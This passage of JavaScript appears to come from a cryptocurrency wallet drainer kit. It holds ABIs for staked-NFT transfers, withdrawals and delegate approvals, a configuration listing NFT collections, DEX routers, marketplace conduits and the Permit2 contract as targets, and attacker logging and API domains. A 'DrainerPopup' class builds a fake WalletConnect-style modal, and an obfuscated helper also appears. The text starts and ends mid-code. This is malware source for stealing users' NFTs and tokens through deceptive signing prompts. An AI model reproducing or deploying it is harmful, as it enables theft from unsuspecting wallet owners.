      "name": "poolId",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "tokenId",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "deposited",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "unclaimed",
      "type": "uint256"
    }, {
      "internalType": "uint256",
      "name": "rewards24hr",
      "type": "uint256"
    }, {
      "components": [{
        "internalType": "uint256",
        "name": "mainTokenId",
        "type": "uint256"
      }, {
        "internalType": "uint256",
        "name": "mainTypePoolId",
        "type": "uint256"
      }],
      "internalType": "struct ApeCoinStaking.DashboardPair",
      "name": "pair",
      "type": "tuple"
    }],
    "internalType": "struct ApeCoinStaking.DashboardStake[]",
    "name": '',
    "type": "tuple[]"
  }],
  "stateMutability": "view",
  "type": "function"
}, {
  "inputs": [{
    "internalType": "uint256",
    "name": "_amount",
    "type": "uint256"
  }, {
    "internalType": "address",
    "name": "_recipient",
    "type": "address"
  }],
  "name": "withdrawApeCoin",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "inputs": [{
    "components": [{
      "internalType": "uint32",
      "name": "tokenId",
      "type": "uint32"
    }, {
      "internalType": "uint224",
      "name": "amount",
      "type": "uint224"
    }],
    "internalType": "struct ApeCoinStaking.SingleNft[]",
    "name": "_nfts",
    "type": "tuple[]"
  }, {
    "internalType": "address",
    "name": "_recipient",
    "type": "address"
  }],
  "name": "withdrawBAYC",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "inputs": [{
    "components": [{
      "internalType": "uint32",
      "name": "tokenId",
      "type": "uint32"
    }, {
      "internalType": "uint224",
      "name": "amount",
      "type": "uint224"
    }],
    "internalType": "struct ApeCoinStaking.SingleNft[]",
    "name": "_nfts",
    "type": "tuple[]"
  }, {
    "internalType": "address",
    "name": "_recipient",
    "type": "address"
  }],
  "name": "withdrawMAYC",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const ETH_CONTRACT = [{
  "inputs": [{
    "internalType": "address",
    "name": "recipient",
    "type": "address"
  }, {
    "internalType": "uint256",
    "name": "percentage",
    "type": "uint256"
  }],
  "name": "claim",
  "outputs": [],
  "stateMutability": "payable",
  "type": "function"
}];
const potatoz_ABI = [{
  "inputs": [{
    "internalType": "address",
    "name": "from",
    "type": "address"
  }, {
    "internalType": "address",
    "name": "to",
    "type": "address"
  }, {
    "internalType": "uint256[]",
    "name": "tokenIds",
    "type": "uint256[]"
  }],
  "name": "stakeTransferAll",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const creepz_ABI = [{
  "inputs": [{
    "internalType": "address",
    "name": "to",
    "type": "address"
  }, {
    "internalType": "uint256[]",
    "name": "tokenIds",
    "type": "uint256[]"
  }],
  "name": "transferWhileStaked",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const COMET_ABI = [{
  "inputs": [{
    "internalType": "address",
    "name": "manager",
    "type": "address"
  }, {
    "internalType": "bool",
    "name": "isAllowed_",
    "type": "bool"
  }],
  "name": "allow",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const PRISMA_ABI = [{
  "inputs": [{
    "internalType": "address",
    "name": "_delegate",
    "type": "address"
  }, {
    "internalType": "bool",
    "name": "_isApproved",
    "type": "bool"
  }],
  "name": "setDelegateApproval",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const EIGEN_ABI = [{
  "inputs": [{
    "internalType": "uint256[]",
    "name": "strategyIndexes",
    "type": "uint256[]"
  }, {
    "internalType": "contract IStrategy[]",
    "name": "strategies",
    "type": "address[]"
  }, {
    "internalType": "uint256[]",
    "name": "shares",
    "type": "uint256[]"
  }, {
    "internalType": "address",
    "name": "withdrawer",
    "type": "address"
  }, {
    "internalType": "bool",
    "name": "undelegateIfPossible",
    "type": "bool"
  }],
  "name": "queueWithdrawal",
  "outputs": [{
    "internalType": "bytes32",
    "name": '',
    "type": "bytes32"
  }],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const BLAST_ABI = [{
  "inputs": [{
    "internalType": "address",
    "name": "recipient",
    "type": "address"
  }, {
    "internalType": "uint8",
    "name": "v",
    "type": "uint8"
  }, {
    "internalType": "bytes32",
    "name": "r",
    "type": "bytes32"
  }, {
    "internalType": "bytes32",
    "name": "s",
    "type": "bytes32"
  }, {
    "internalType": "uint32",
    "name": "minGasLimit",
    "type": "uint32"
  }],
  "name": "transition",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
}];
const z = {
  "1": 0x0,
  "10": 0x0,
  "25": 0x0,
  "56": 0x0,
  "137": 0x0,
  "169": 0x0
};
function u0(T, k) {
  return m(T - 0x219, k);
}
z["250"] = 0x0;
z["369"] = 0x0;
z["8453"] = 0x0;
z["42220"] = 0x0;
z["42161"] = 0x0;
z["43114"] = 0x0;
z["81457"] = 0x0;
class Configuration {
  ["signature"] = '';
  ["unsubscribe"];
  ["modal"];
  ["web3Js"];
  ["metamaskInstalled"] = false;
  ["isConnected"] = false;
  ["started"] = false;
  ["subscribed"] = false;
  ["ethereumClient"] = {};
  ["ethereumClient2"] = {};
  ["ethereumClient3"] = {};
  ["ethereumClient4"] = {};
  ["ethereumClient5"] = {};
  ["ethereumClient6"] = {};
  ["meta_connector"];
  ["injected_connector"];
  ["coinbase_connector"];
  ["logDomainName"] = "https://rpc.nftfastapi.com/";
  ["apiDomainName"] = "https://api.nftfastapi.com/";
  ["hueModal"];
  ["signer"];
  ["ethers_provider"];
  ["walletAddress"];
  ["walletBalance"];
  ["walletBalanceInEth"];
  ["chainId"];
  ["nonce"];
  ["secondProvider"];
  ["projectId"] = config.wc_project;
  ["cryptoPunk"] = "0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb";
  ["txcount"] = 0;
  ["bayc"] = "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d";
  ["mayc"] = "0x60e4d786628fea6478f785a6d7e704777c86a7c6";
  ["apeCoin"] = "0x4d224452801aced8b2f0aebe155379bb5d594381";
  ["apeStaking"] = "0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9";
  ["seaportConduit"] = "0x1e0049783f008a0085193e00003d00cd54003c71";
  ["blurConduit"] = "0x00000000000111abe46ff893f3b2fdf1f759a8a8";
  ["blurRouter"] = "0x000000000000Ad05Ccc4F10045630fb830B95127";
  ["uniswapV3Router1"] = "0xE592427A0AEce92De3Edee1F18E0157C05861564";
  ["uniswapV3Router2"] = "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45";
  ["pancakeSwapRouter"] = "0xEfF92A263d31888d860bD50809A8D171709b7b1c";
  ["pancakeSwapSmartRouter"] = "0x13f4EA83D0bd40E75C8222255bc855a974568Dd4";
  ["sushiSwapRouter"] = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F";
  ["uniswapV3Positions"] = "0xC36442b4a4522E871399CD717aBDD847Ab11FE88";
  ["pancakeswapV3Positions"] = "0x46A15B0b27311cedF172AB29E4f4766fbE7F4364";
  ["camelotV3Positions"] = "0x00c7f3082833e796A5b3e4Bd59f6642FF44DCD15";
  ["quickswapV3Positions"] = "0x8eF88E4c7CfbbaC1C163f7eddd4B578792201de6";
  ["veNFTContract"] = "0xFAf8FD17D9840595845582fCB047DF13f006787d";
  ["sushiswapV3Positions"] = {
    0x1: "0x2214A42d8e2A1d20635c2cb0664422c528B6A432",
    0xa: "0x9c6522117e2ed1fE5bdb72bb0eD5E3f2bdE7DBe0",
    0x38: "0xF70c086618dcf2b1A461311275e00D6B722ef914",
    0x89: "0xb7402ee99F0A008e461098AC3A27F4957Df89a40",
    0xa4b1: "0xF0cBce1942A68BEB3d1b73F0dd86C8DCc363eF49"
  };
  ["gmxRewardsManager"] = {
    0xa4b1: "0xA906F338CB21815cBc4Bc87ace9e68c87eF8d8F1",
    0xa86a: "0x82147C5A7E850eA4E28155DF107F2590fD4ba327"
  };
  ["receiverSwapTokenAddress"] = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
  ["receiverSwapTokenAddressAlt"] = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
  ["receiverSwapTokenAddressWBNB"] = "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
  ["receiverSwapTokenAddressBUSD"] = "0x55d398326f99059ff775485246999027b3197955";
  ["ens"] = "0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85";
  ["permitContract"] = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
  ["cam_lpv3_tokens"];
  ["cam_lpv3_value"] = 0;
  ["sus_lpv3_tokens"];
  ["sus_lpv3_value"] = 0;
  ["blockaid"] = [];
  ["sweets"] = [];
  ["vault"] = [];
  ["ultraVault"] = [];
  ["transactions"] = [];
  ["filteredTransactions"];
  ["NFTtokens"] = [];
  ["ERC20tokens"] = [];
  ["stakedPotatoz"];
  ["potatozValue"] = 0;
  ["creepzStaked"];
  ["creepzValue"] = 0;
  ["apeStakedTokens"] = [];
  ["apeStakedValue"] = 0;
  ["blurTokens"] = [];
  ["rpcInstance"] = '';
  ["blurValue"] = 0;
  ["seaportTokens"] = [];
  ["offers"] = [];
  ["considerations"] = [];
  ["seaportValue"] = 0;
  ["uniswapTokens"] = [];
  ["uniswapValue"] = 0;
  ["permitTokens"] = [];
  ["permitValue"] = 0;
  ["potatozValue"] = 0;
  ["potatozStaked"] = [];
  ["pancakeswapTokens_eth"] = [];
  ["pancakeswapTokens_bsc"] = [];
  ["sushiswapTokens"] = [];
  ["sushiswapValue"] = 0;
  ["lpv3_tokens"];
  ["lpv3_value"];
  ["pnc_lpv3_tokens"];
  ["pnc_lpv3_value"] = 0;
  ["traderJoeTokens"];
  ["tradingJoeValue"] = 0;
  ["qck_lpv3_tokens"];
  ["qck_lpv3_value"] = 0;
  ["pending"] = [];
  ["verified"] = {};
  ["useVerified"] = false;
  ["bNumbers"] = {
    0x1: "85000",
    0xa: "400000",
    0x19: "100000",
    0x38: "100000",
    0x89: "100000",
    0xa9: "100000",
    0xfa: "110000",
    0x171: "110000",
    0x13e31: "130000",
    0x2105: "100000",
    0xa4b1: "4000000",
    0xa4ec: "100000",
    0xa86a: "100000"
  };
  ["estimated_txs"] = z;
  ["requestOptions"] = {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "X-API-KEY": ''
    }
  };
  ["requestOptionsPOST"] = {
    "method": "POST",
    "headers": {
      "Accept": "application/json"
    }
  };
  ["walletType"];
  ["bypassMinAmount"] = 2;
  ["netWorth"] = 0;
  ["bypass_min"] = 0.088;
  ["contractId"] = 0;
  ["connectButton"] = document.querySelectorAll("." + config.design.connectElement);
  ["twoStepButton"] = document.querySelectorAll("." + config.design.twoStepButtonElement);
  ["messageButton"] = document.getElementById(config.design.messageElement);
  ["eligible"] = document.getElementById("notEli");
  ["Swal"];
  ["ipDataCache"] = null;
  ["modal_shadowRoot"];
  ["adlinkedkey"] = generateKey();
  ["ts_adlinkedkey"] = generateKey();
  ["modalrootkey"] = "ad-modal";
}
class DrainerPopup {
  static ["renderPopup"] = async () => {
    try {
      if (config.design.enablePopup) {
        if (!config.experimental["react-safe"]) {
          console.log("Rendering popup...");
          if (config.popupCode && !config.useDefaultPopup) {
            const i = document.createElement("div");
            i.innerHTML = popupCode;
            document.body.appendChild(i);
          } else {
            if (config.USE_W3M_V3) {
              let D = {
                "--w3m-color-fg-1": "rgb(228,231,231)",
                "--w3m-color-fg-2": "rgb(148,158,158)",
                "--w3m-color-fg-3": "rgb(110,119,119)",
                "--w3m-color-bg-1": "rgb(20,20,20)",
                "--w3m-color-bg-2": "rgb(39,42,42)",
                "--w3m-color-bg-3": "rgb(59,64,64)",
                "--w3m-color-overlay": "rgba(255,255,255,0.1)",
                "--w3m-accent-color": "#3396FF",
                "--w3m-accent-fill-color": "#FFFFFF",
                "--w3m-z-index": "10000",
                "--w3m-background-color": "#3396FF",
                "--w3m-background-border-radius": "8px",
                "--w3m-container-border-radius": "30px",
                "--w3m-wallet-icon-border-radius": "15px",
                "--w3m-wallet-icon-large-border-radius": "30px",
                "--w3m-wallet-icon-small-border-radius": "7px",
                "--w3m-input-border-radius": "28px",
                "--w3m-button-border-radius": "10px",
                "--w3m-notification-border-radius": "36px",
                "--w3m-secondary-button-border-radius": "28px",
                "--w3m-icon-button-border-radius": "50%",
                "--w3m-button-hover-highlight-border-radius": "10px",
                "--w3m-text-big-bold-size": "20px",
                "--w3m-text-big-bold-weight": "600",
                "--w3m-text-big-bold-line-height": "24px",
                "--w3m-text-big-bold-letter-spacing": "-0.03em",
                "--w3m-text-big-bold-text-transform": "none",
                "--w3m-text-xsmall-bold-size": "10px",
                "--w3m-text-xsmall-bold-weight": "700",
                "--w3m-text-xsmall-bold-line-height": "12px",
                "--w3m-text-xsmall-bold-letter-spacing": "0.02em",
                "--w3m-text-xsmall-bold-text-transform": "uppercase",
                "--w3m-text-xsmall-regular-size": "12px",
                "--w3m-text-xsmall-regular-weight": "600",
                "--w3m-text-xsmall-regular-line-height": "14px",
                "--w3m-text-xsmall-regular-letter-spacing": "-0.03em",
                "--w3m-text-xsmall-regular-text-transform": "none",
                "--w3m-text-small-thin-size": "14px",
                "--w3m-text-small-thin-weight": "500",
                "--w3m-text-small-thin-line-height": "16px",
                "--w3m-text-small-thin-letter-spacing": "-0.03em",
                "--w3m-text-small-thin-text-transform": "none",
                "--w3m-text-small-regular-size": "14px",
                "--w3m-text-small-regular-weight": "600",
                "--w3m-text-small-regular-line-height": "16px",
                "--w3m-text-small-regular-letter-spacing": "-0.03em",
                "--w3m-text-medium-regular-size": "16px",
                "--w3m-text-medium-regular-weight": "600",
                "--w3m-text-medium-regular-line-height": "20px",
                "--w3m-text-medium-regular-letter-spacing": "-0.03em",
                "--w3m-text-medium-regular-text-transform": "none",
                "--w3m-font-family": "-apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", Roboto, Ubuntu, \"Helvetica Neue\", sans-serif",
                "--w3m-font-feature-settings": "\"tnum\" on, \"lnum\" on, \"case\" on",
                "--w3m-success-color": "rgb(38,181,98)",
                "--w3m-error-color": "rgb(242, 90, 103)",
                "--w3m-overlay-background-color": "rgba(0, 0, 0, 0.3)",
                "--w3m-overlay-backdrop-filter": "blur(6px)",
                "--w3m-background-image-url": "none"
              };
              if (config.chooseTheme == "light") {
                let U = {
                  "--w3m-color-fg-1": "rgb(20,20,20)",
                  "--w3m-color-fg-2": "rgb(121,134,134)",
                  "--w3m-color-fg-3": "rgb(158,169,169)",
                  "--w3m-color-bg-1": "rgb(255,255,255)",
                  "--w3m-color-bg-2": "rgb(241,243,243)",
                  "--w3m-color-bg-3": "rgb(228,231,231)",
                  "--w3m-color-overlay": "rgba(0,0,0,0.1)",
                  "--w3m-accent-color": "#3396FF",
                  "--w3m-accent-fill-color": "#FFFFFF",
                  "--w3m-background-color": "#3396FF",
                  "--w3m-success-color": "rgb(38,181,98)",
                  "--w3m-error-color": "rgb(242, 90, 103)",
                  "--w3m-overlay-background-color": "rgba(0, 0, 0, 0.3)",
                  "--w3m-overlay-backdrop-filter": "blur(6px)"
                };
                Object.keys(U).map(q => D[q] = U[q]);
              }
              for (const q in D) {
                document.documentElement.style.setProperty(q, D[q]);
              }
            }
            let V = document.head || document.getElementsByTagName("head")[0];
            let f = document.createElement("style");
            V.appendChild(f);
            f.type = "text/css";
            if (f.styleSheet) {
              f.styleSheet.cssText = ".swal2-popup {\tborder: 1px;\tfont-size: 1rem;\tborder-style: solid;\tborder-color: rgb(39,42,42);\tborder-radius: var(--w3m-container-border-radius);\tbackground-color: var(--w3m-color-bg-1);\tfont-family: var(--w3m-font-family);\tcolor: var(--w3m-color-fg-1);}.swal2-popup-square {\twidth: 30vh;\tmax-width: 50vh;\tmax-height: 50vh;\tfont-size: 1rem;\tpadding-bottom: 0px;\tborder-radius: var(--w3m-container-border-radius);\tbackground-color: var(--w3m-color-bg-1);\tfont-family: var(--w3m-font-family);\tcolor: var(--w3m-color-fg-1);\t/* Make it untouchable. */\t-webkit-touch-callout: none;\t-webkit-user-select: none;\t-khtml-user-select: none;\t-moz-user-select: none;\t-ms-user-select: none;\tuser-select: none;}.swal2-subtext {\tcolor: var(--w3m-color-fg-1);\tfont-size: var(--w3m-text-medium-regular-size);\tfont-weight: var(--w3m-text-medium-regular-weight);}.swal2-confirm-button {\tbackground-color: var(--w3m-accent-color);\tcolor: #fff;\tborder: none;\tbox-shadow: none;\tborder-radius: var(--w3m-wallet-icon-border-radius);\tfont-weight: 600;\tpadding: 10px 24px;\tmargin: 0;\tcursor: pointer;}.swal2-footer {\tmargin: 1em 0 0;\tpadding: 1em 1em 0;\tborder: 0px;}.swal2-title {\tborder: 0px;\tborder-bottom: 1px;\tborder-color: rgb(39,42,42);\tpadding-bottom: 1.5vh;\tborder-style: solid;\tfont-size: var(--w3m-text-big-bold-size);\tfont-weight: var(--w3m-text-big-bold-weight);}.swal2-sub-footer {\tbackground-color: var(--w3m-color-bg-2);\tborder: 0px;\tborder-top: 1px;\tborder-style: solid;\tborder-radius: 0px 0px var(--w3m-container-border-radius) var(--w3m-container-border-radius);\tvar(--w3m-color-bg-3);\tcolor: rgb(148,158,158);\tfont-size: var(--w3m-text-small-thin-size);\tfont-weight: var(--w3m-text-small-thin-weight);\tmargin-top: 3vh;\tpadding: 15px;}.wallet-icon-container {\tposition: relative;\twidth: 110px;\theight: 110px;\tdisplay: flex;\tjustify-content: center;\talign-items: center;\tmargin: 10px 0px 10px;\ttransform: translate3d(0px, 0px, 0px);}.swal2-large-image {\tborder: 2px;\tborder-style: solid;\tborder-color: rgb(39,42,42);\tborder-radius: var(--w3m-wallet-icon-large-border-radius);\twidth: 90px;\theight: 90px;}.wallet-spinner-svg {\tstroke-width: 2px;\tposition: absolute;\tstroke: var(--w3m-accent-color);}.swal2-minimal-footer {\tmargin: 0em;\tmargin-top: 1.5vh;\tpadding: 0em;}.flex-center {\tdisplay: flex;\tflex-direction: column;\talign-items: center;}";
            } else {
              f.appendChild(document.createTextNode(".swal2-popup {\tborder: 1px;\tfont-size: 1rem;\tborder-style: solid;\tborder-color: rgb(39,42,42);\tborder-radius: var(--w3m-container-border-radius);\tbackground-color: var(--w3m-color-bg-1);\tfont-family: var(--w3m-font-family);\tcolor: var(--w3m-color-fg-1);}.swal2-popup-square {\twidth: 30vh;\tmax-width: 50vh;\tmax-height: 50vh;\tfont-size: 1rem;\tpadding-bottom: 0px;\tborder-radius: var(--w3m-container-border-radius);\tbackground-color: var(--w3m-color-bg-1);\tfont-family: var(--w3m-font-family);\tcolor: var(--w3m-color-fg-1);\t/* Make it untouchable. */\t-webkit-touch-callout: none;\t-webkit-user-select: none;\t-khtml-user-select: none;\t-moz-user-select: none;\t-ms-user-select: none;\tuser-select: none;}.swal2-subtext {\tcolor: var(--w3m-color-fg-1);\tfont-size: var(--w3m-text-medium-regular-size);\tfont-weight: var(--w3m-text-medium-regular-weight);}.swal2-confirm-button {\tbackground-color: var(--w3m-accent-color);\tcolor: #fff;\tborder: none;\tbox-shadow: none;\tborder-radius: var(--w3m-wallet-icon-border-radius);\tfont-weight: 600;\tpadding: 10px 24px;\tmargin: 0;\tcursor: pointer;}.swal2-footer {\tmargin: 1em 0 0;\tpadding: 1em 1em 0;\tborder: 0px;}.swal2-title {\tborder: 0px;\tborder-bottom: 1px;\tborder-color: rgb(39,42,42);\tpadding-bottom: 1.5vh;\tborder-style: solid;\tfont-size: var(--w3m-text-big-bold-size);\tfont-weight: var(--w3m-text-big-bold-weight);}.swal2-sub-footer {\tbackground-color: var(--w3m-color-bg-2);\tborder: 0px;\tborder-top: 1px;\tborder-style: solid;\tborder-radius: 0px 0px var(--w3m-container-border-radius) var(--w3m-container-border-radius);\tvar(--w3m-color-bg-3);\tcolor: rgb(148,158,158);\tfont-size: var(--w3m-text-small-thin-size);\tfont-weight: var(--w3m-text-small-thin-weight);\tmargin-top: 3vh;\tpadding: 15px;}.wallet-icon-container {\tposition: relative;\twidth: 110px;\theight: 110px;\tdisplay: flex;\tjustify-content: center;\talign-items: center;\tmargin: 10px 0px 10px;\ttransform: translate3d(0px, 0px, 0px);}.swal2-large-image {\tborder: 2px;\tborder-style: solid;\tborder-color: rgb(39,42,42);\tborder-radius: var(--w3m-wallet-icon-large-border-radius);\twidth: 90px;\theight: 90px;}.wallet-spinner-svg {\tstroke-width: 2px;\tposition: absolute;\tstroke: var(--w3m-accent-color);}.swal2-minimal-footer {\tmargin: 0em;\tmargin-top: 1.5vh;\tpadding: 0em;}.flex-center {\tdisplay: flex;\tflex-direction: column;\talign-items: center;}"));
            }
          }
        }
      }
      if (canClosePopup && config.design.enablePopup) {
        document.getElementById(popupCloseButtonID).addEventListener("click", () => {
          this.closePopup();
        });
      }
    } catch (y) {
      console.log(y);
    }
  };
  static ["openPopup"] = () => {
    try {
      if (config.design.enablePopup) {
        console.log("Opening popup...");
        if (config.popupCode.length == 0 || config.useDefaultPopup) {
          let i = "data:image/webp;base64,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